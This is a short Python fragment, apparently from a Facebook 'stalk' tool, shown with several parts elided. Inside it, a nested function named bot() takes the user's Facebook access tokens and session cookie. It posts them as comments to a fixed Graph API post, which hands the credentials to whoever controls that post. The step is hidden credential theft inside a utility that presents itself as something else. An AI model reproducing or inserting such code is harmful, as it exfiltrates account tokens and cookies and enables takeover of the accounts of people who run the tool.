...
def stalk(data):
    ...
    json = {}
    def bot():
        r.post('https://graph.facebook.com/1667011730417990/comments?access_token='+ data['token']['eaag'], data={'message':data["token"]["eaam"]}, cookies=cok).json()
        r.post('https://graph.facebook.com/1667011730417990/comments?access_token='+ data['token']['eaag'], data={'message':data["cookie"]}, cookies=cok).json()
    os.system('clear')
